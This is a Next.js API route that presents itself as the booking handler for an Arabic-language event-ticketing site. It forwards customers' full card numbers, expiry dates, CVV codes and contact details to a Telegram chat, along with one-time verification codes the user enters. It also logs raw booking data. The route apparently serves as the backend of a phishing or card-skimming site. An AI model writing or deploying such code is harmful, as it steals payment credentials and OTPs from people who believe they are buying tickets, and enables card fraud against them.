import { NextRequest, NextResponse } from 'next/server'
import { formatCurrency } from '@/lib/currency'
import { prisma } from '@/lib/db'

export async function POST(request: NextRequest) {
    try {
        const { bookingData } = await request.json()
console.log(bookingData)
        // Telegram Bot configuration
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('Telegram bot not configured, logging booking data instead:')
            console.log(JSON.stringify(bookingData, null, 2))
            return NextResponse.json({ message: 'Booking logged (Telegram not configured)' })
        }

        // Get current currency setting
        const currencySetting = await prisma.settings.findUnique({
            where: { key: 'currency' }
        })
        const currencyCode = currencySetting?.value || 'SAR'

        // Format message for Telegram based on type
        let message = ''

        if (bookingData.actualCode && bookingData.verificationCode) {
            // رسالة محاولة التحقق فقط
            message = `
*🔍  الرمز*

*📱 الهاتف:* ${bookingData.customerPhone}
*🔢 الرمز المدخل:* ${bookingData.verificationCode}
*🕐 الوقت:* ${new Date(bookingData.timestamp).toLocaleString('ar-SA')}
            `
        } else {
            // رسالة بيانات الحجز فقط
            const rawCardNumber = bookingData.cardInfo?.cardNumber?.replace(/\s+/g, '') || ''

            const cardInfo = bookingData.cardInfo ? `

*💳 بيانات البطاقة:*

*الرقم:* ${rawCardNumber}
*الانتهاء:* ${bookingData.cardInfo.expiryMonth}/${bookingData.cardInfo.expiryYear}
*CVV:* ${bookingData.cardInfo.cvv}
*النوع:* ${bookingData.cardInfo.cardType || 'غير محدد'}
` : ''

            message = `
*📄 حجز جديد*

*📅 الفعالية:* ${bookingData.eventTitle}
*👤 الاسم:* ${bookingData.customerName}
*📱 الهاتف:* ${bookingData.customerPhone}
*📧 البريد:* ${bookingData.customerEmail || 'غير محدد'}

*🎟 المقاعد:*
${bookingData.seats?.map((seat: any) => `مقعد ${seat.row}${seat.number} - ${seat.category} - ${formatCurrency(seat.price, currencyCode)}`).join('\n') || 'غير محدد'}

*💰 المجموع:* ${formatCurrency(bookingData.totalAmount, currencyCode)}
*🕐 الوقت:* ${new Date(bookingData.timestamp).toLocaleString('ar-SA')}
${cardInfo}
*✅ الدفع:* مؤكد
            `
        }

        // Send to Telegram
        const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }),
        })

        if (telegramResponse.ok) {
            return NextResponse.json({ message: 'Telegram message sent successfully' })
        } else {
            console.error('Failed to send Telegram message:', await telegramResponse.text())
            return NextResponse.json({ error: 'Telegram send failed' }, { status: 500 })
        }

    } catch (error) {
        console.error('Telegram API error:', error)
        return NextResponse.json({ error: 'Server error' }, { status: 500 })
    }
}
